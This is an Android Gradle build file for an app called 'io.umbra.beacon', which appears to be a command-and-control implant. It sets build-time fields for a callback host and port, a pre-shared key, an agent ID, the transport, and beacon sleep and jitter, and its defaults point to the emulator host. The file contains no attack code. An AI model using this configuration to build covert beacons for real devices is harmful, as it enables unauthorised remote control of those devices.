def envOr(String key, String fallback) {
    def value = System.getenv(key)
    return (value == null || value.trim().isEmpty()) ? fallback : value.trim()
}

plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'io.umbra.beacon'
    compileSdk 34

    defaultConfig {
        applicationId "io.umbra.beacon"
        // X25519 is provided by the platform XDH provider from API 33 onwards.
        minSdk 33
        targetSdk 34
        versionCode 1
        versionName "0.1.0"

        ndk {
            abiFilters 'arm64-v8a', 'armeabi-v7a', 'x86_64'
        }
        externalNativeBuild {
            cmake {
                cppFlags "-std=c++17"
            }
        }

        // ---- build-time beacon configuration -------------------------
        // Provide these as environment variables when building the APK:
        //   UMBRA_HOST UMBRA_PORT UMBRA_PSK UMBRA_AGENT_ID UMBRA_TRANSPORT
        //   UMBRA_HTTP_BASE UMBRA_HTTP_PATH UMBRA_SLEEP UMBRA_JITTER
        buildConfigField "String", "UMBRA_HOST", "\"${envOr('UMBRA_HOST', '10.0.2.2')}\""
        buildConfigField "int", "UMBRA_PORT", "${envOr('UMBRA_PORT', '4001')}"
        buildConfigField "String", "UMBRA_PSK_HEX", "\"${envOr('UMBRA_PSK', '')}\""
        buildConfigField "String", "UMBRA_AGENT_ID", "\"${envOr('UMBRA_AGENT_ID', '')}\""
        buildConfigField "String", "UMBRA_TRANSPORT", "\"${envOr('UMBRA_TRANSPORT', 'tcp')}\""
        buildConfigField "String", "UMBRA_HTTP_BASE", "\"${envOr('UMBRA_HTTP_BASE', 'http://10.0.2.2:4003')}\""
        buildConfigField "String", "UMBRA_HTTP_PATH", "\"${envOr('UMBRA_HTTP_PATH', '/api/v1/beacon')}\""
        buildConfigField "int", "UMBRA_SLEEP", "${envOr('UMBRA_SLEEP', '15')}"
        buildConfigField "int", "UMBRA_JITTER", "${envOr('UMBRA_JITTER', '30')}"
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
        }
    }

    buildFeatures {
        buildConfig true
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = '17'
    }

    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
            version "3.22.1"
        }
    }

    packagingOptions {
        jniLibs {
            useLegacyPackaging = false
        }
    }
}

dependencies {
    // The beacon deliberately has no third-party runtime dependencies: the
    // platform already provides AES-GCM, HMAC and X25519.
}
